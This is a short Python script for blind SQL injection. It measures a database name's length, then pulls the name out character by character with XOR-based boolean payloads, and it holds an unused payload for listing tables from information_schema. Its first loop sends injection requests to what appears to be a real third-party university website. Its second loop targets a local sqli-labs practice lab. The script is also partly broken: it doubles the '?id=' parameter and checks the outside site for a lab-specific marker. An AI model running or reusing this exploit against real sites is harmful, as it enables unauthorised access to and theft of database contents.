import requests
import time
def exp():
    b=[]
    for a in range(1,20):
        url='http://jmr.whu.edu.cn/article.php?id=71'
        payload="?id=1'^(length((database()))<>{})^0%23".format(a)
        url1=url+payload
        print(url1)
        response1=requests.get(url1)
        if "Dumb" in response1.text:
            p=a
            print(p)
            break
    for i in range(1,p+1):
        for j in range(97,127):
            url='http://127.0.0.1/sqli-labs-master/Less-1/'
            payload="?id=1'^((ascii(mid((database())from({}))))<>{})^0%23".format(i,j)
            payload1="?id=1'^((ascii(mid((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))from({}))))<>{})^0%23".format(i,j)
            url1=url+payload
            print(url1)
            response=requests.get(url1)
            if "Dumb" in response.text:
                char=chr(j)
                b.append(char)
                print(''.join(b))
                break
exp()


    
